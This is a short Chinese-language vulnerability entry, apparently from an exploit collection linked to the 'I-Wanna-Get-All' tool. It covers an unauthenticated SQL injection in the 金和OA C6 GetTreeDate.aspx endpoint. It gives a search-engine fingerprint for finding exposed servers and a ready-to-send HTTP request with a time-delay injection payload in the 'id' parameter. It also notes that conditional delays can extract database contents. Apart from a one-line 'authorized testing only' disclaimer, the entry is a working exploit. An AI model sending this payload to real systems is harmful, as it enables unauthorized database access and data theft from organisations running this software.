---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 金和OA GetTreeDate.aspx SQL注入漏洞

## 漏洞描述

金和OA C6 `/C6/Jhsoft.Web.users/GetTreeDate.aspx/` 接口 `id` 参数存在 SQL 注入漏洞（SQL Server 延时盲注），无需登录即可利用。

## 影响版本

```
金和OA C6
```

## 网络测绘

```
app="金和OA"
```

## 漏洞复现

```
GET /C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bwaitfor/**/+delay/**/+%270%3a0%3a3%27+--%20and%201=1 HTTP/1.1
```

响应延迟 3 秒左右即存在注入；构造条件延时语句可逐位提取数据库数据。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
